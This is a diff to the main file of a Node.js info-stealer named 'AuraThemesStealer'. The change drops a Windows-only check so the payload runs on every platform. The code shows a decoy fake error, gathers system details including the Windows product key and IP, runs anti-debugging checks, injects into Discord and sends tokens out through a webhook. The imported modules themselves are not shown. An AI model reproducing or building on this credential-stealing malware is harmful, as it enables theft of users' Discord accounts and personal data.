@@ -1,37 +1,31 @@
 const { error } = require("./utils/console/error");
-const process = require("process");
+const { getInfo } = require("./modules/core/core");
+const { discordInjected } = require("./modules/injections/discord");
+const { fakeError } = require("./modules/fakeerror/fake");
+const { webhookTokens } = require("./modules/tokens/send");
+const { antidebug } = require("./modules/antidebug/antidebug");
+
 const config = require("./config/config")();
 
 require("dotenv").config();
 
-switch (process.platform) {
-    case "win32":
-        const { getInfo } = require("./modules/core/core");
-        const { discordInjected } = require("./modules/injections/discord");
-        const { fakeError } = require("./modules/fakeerror/fake");
-        const { webhookTokens } = require("./modules/tokens/send");
-        const { antidebug } = require("./modules/antidebug/antidebug");
-
-        class AuraThemesStealer {
-            constructor() {
-                this.aurita();
-            }
-            async aurita() {
-                try {
-                    const { DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION } = await getInfo();
-                    fakeError(config.fakeErrorMessage);
-                    await antidebug(config.debugger, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
-                    await discordInjected(config.injection);
-                    await webhookTokens();
-                } catch (error) {
-                    return console.error('An error occurred in main', error);
-                }
-            }
+class AuraThemesStealer {
+    constructor() {
+        this.aurita();
+    }
+    async aurita() {
+        try {
+            await fakeError(config.fakeErrorMessage);
+            const { DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION } = await getInfo();
+            await antidebug(config.debugger, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
+            await discordInjected(config.injection);
+            await webhookTokens();
+        } catch (error) {
+            console.error('An error occurred in main', error);
         }
-        new AuraThemesStealer()
-        break;
-    default:
-        break;
+    }
 }
+
+new AuraThemesStealer();
 
 error();
